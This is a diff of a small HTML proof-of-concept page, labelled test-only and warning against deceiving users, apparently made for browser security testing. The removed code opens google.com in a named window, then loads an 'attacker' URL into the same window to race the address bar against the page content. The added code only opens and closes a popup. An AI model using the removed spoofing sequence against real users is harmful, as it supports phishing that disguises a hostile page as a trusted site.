@@ -1,128 +1,43 @@
 <!doctype html>
 <html lang="id">
-<head>
-<meta charset="utf-8"/>
-<meta name="viewport" content="width=device-width,initial-scale=1"/>
-<title>PoC Auto-Return — TEST ONLY</title>
-<style>
-  body{font-family:system-ui,Segoe UI,Roboto,Arial;margin:18px;background:#f6f8fb}
-  .card{max-width:880px;margin:0 auto;background:#fff;padding:18px;border-radius:10px;box-shadow:0 6px 18px rgba(0,0,0,.06)}
-  button{padding:8px 12px;border-radius:8px;border:0;background:#0b66ff;color:#fff;cursor:pointer}
-  button.warn{background:#ff6b6b}
-  label{margin-right:8px}
-  #log{background:#0b1220;color:#e6f0ff;padding:10px;border-radius:8px;max-height:280px;overflow:auto;white-space:pre-wrap}
-  .badge{display:inline-block;padding:4px 8px;border-radius:6px;background:#111;color:#fff;margin-left:8px;font-size:12px}
-</style>
+<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>PoC: open+close popup (TEST ONLY)</title>
+<style>body{font-family:system-ui;padding:18px;background:#f6f8fb}button{padding:10px 14px;border-radius:8px;background:#0b66ff;color:#fff;border:0;cursor:pointer}</style>
 </head>
 <body>
-  <div class="card">
-    <h2>PoC Auto-Return — Address Bar Race (TEST ONLY)</h2>
-    <p><strong>PERINGATAN:</strong> Jalankan hanya pada perangkat / app yang kamu kontrol. PoC ini untuk pengujian internal. Jangan gunakan untuk menipu pengguna.</p>
+  <h3>PoC — open then close (TEST ONLY)</h3>
+  <p>Tekan tombol untuk buka google lalu tutup otomatis. Hanya untuk pengujian internal.</p>
 
-    <div style="display:flex;gap:8px;align-items:center;margin-bottom:8px">
-      <label>delayOpen (ms): <input id="delayOpen" type="number" value="300" style="width:90px"></label>
-      <label>delayReturn (ms): <input id="delayReturn" type="number" value="2000" style="width:90px"></label>
-      <label>returnMode:
-        <select id="mode">
-          <option value="navigate">A — navigate attackerURL (recommended)</option>
-          <option value="close">B — close window (return focus to main)</option>
-        </select>
-      </label>
-      <button id="run">Run</button>
-      <button id="abort" class="warn">Abort</button>
-      <span class="badge">TEST ONLY</span>
-    </div>
-
-    <p style="margin:6px 0">Flow: <em>open google → after delayOpen open attacker in same window → after delayReturn perform returnMode</em>. Amati address bar vs content in opened window; rekam layar untuk bukti.</p>
-
-    <div id="log">LOG: ready</div>
-  </div>
+  <label>Delay close (ms): <input id="delay" type="number" value="150" style="width:80px"></label>
+  <button id="run">Run</button>
+  <pre id="log">LOG: ready</pre>
 
 <script>
-  const runBtn = document.getElementById('run');
-  const abortBtn = document.getElementById('abort');
-  const logEl = document.getElementById('log');
-  const delayOpenEl = document.getElementById('delayOpen');
-  const delayReturnEl = document.getElementById('delayReturn');
-  const modeEl = document.getElementById('mode');
+const runBtn = document.getElementById('run');
+const logEl = document.getElementById('log');
+function log(s){ logEl.textContent += '\\n' + s; logEl.scrollTop = 1e9; }
 
-  let winRef = null;
-  let timers = [];
-
-  function log(s){
-    const ts = new Date().toISOString().slice(11,23);
-    logEl.textContent += `\n[${ts}] ${s}`;
-    logEl.scrollTop = logEl.scrollHeight;
-  }
-
-  function clearTimers(){
-    timers.forEach(t => clearTimeout(t));
-    timers = [];
-  }
-
-  runBtn.addEventListener('click', () => {
-    clearTimers();
-    log('=== sequence START ===');
-    const delayOpen = Math.max(0, parseInt(delayOpenEl.value||"300",10));
-    const delayReturn = Math.max(0, parseInt(delayReturnEl.value||"2000",10));
-    const mode = modeEl.value;
-    const attacker = 'https://mohammedalqi.github.io/';
-    const target = 'https://www.google.com/';
-
-    // Step 1: open google in named window 'x'
-    try {
-      winRef = window.open(target, 'x');
-      if (!winRef) {
-        log('window.open returned null (popup blocked). Aborting.');
-        return;
-      }
-      log(`opened ${target} in window name "x"`);
-    } catch (e) {
-      log('window.open error: ' + e);
-      return;
-    }
-
-    // Step 2: after delayOpen, open attacker in same window name 'x'
-    timers.push(setTimeout(() => {
+runBtn.addEventListener('click', () => {
+  const delay = Math.max(0, parseInt(document.getElementById('delay').value||"150",10));
+  log('[*] Attempting popup open → google');
+  try {
+    // buka popup; gunakan target name unik jika ingin reuse: 'x' atau '_blank' jika ingin new
+    const w = window.open('https://www.google.com/', '_blank', 'noopener');
+    if (!w) { log('[!] popup blocked (window.open returned null)'); alert('Popup blocked — enable popups for this site'); return; }
+    log('[+] popup opened');
+    // tutup popup setelah delay
+    setTimeout(() => {
       try {
-        window.open(attacker, 'x'); // reuse same name -> navigates same window
-        log(`after ${delayOpen}ms: opened attacker ${attacker} into same window "x"`);
-      } catch (e) {
-        log('open attacker error: ' + e);
+        w.close();
+        log(`[+] popup closed after ${delay} ms`);
+      } catch(e) {
+        log('[!] failed to close popup: ' + e);
       }
-    }, delayOpen));
-
-    // Step 3: after delayOpen + delayReturn, perform return action automatically
-    timers.push(setTimeout(() => {
-      try {
-        if (!winRef || winRef.closed) {
-          log('window not available to return/close');
-        } else {
-          if (mode === 'navigate') {
-            // Navigate programmatically to attacker URL (this does not rely on history.back)
-            // This is a reliable navigation action across origins.
-            winRef.location.href = attacker;
-            log(`after ${delayOpen + delayReturn}ms: programmatically set window.location.href => ${attacker} (navigate mode)`);
-          } else {
-            // Close window so focus returns to opener (main page)
-            winRef.close();
-            log(`after ${delayOpen + delayReturn}ms: closed window "x" (close mode)`);
-          }
-        }
-      } catch (e) {
-        log('return action error: ' + e);
-      } finally {
-        log('=== sequence END ===');
-      }
-    }, delayOpen + delayReturn));
-  });
-
-  abortBtn.addEventListener('click', () => {
-    clearTimers();
-    try { if (winRef && !winRef.closed) winRef.close(); } catch(e){}
-    winRef = null;
-    log('ABORT: timers cleared, window closed if present');
-  });
+    }, delay);
+  } catch (e) {
+    log('[!] window.open error: ' + e);
+  }
+});
 </script>
 </body>
 </html>
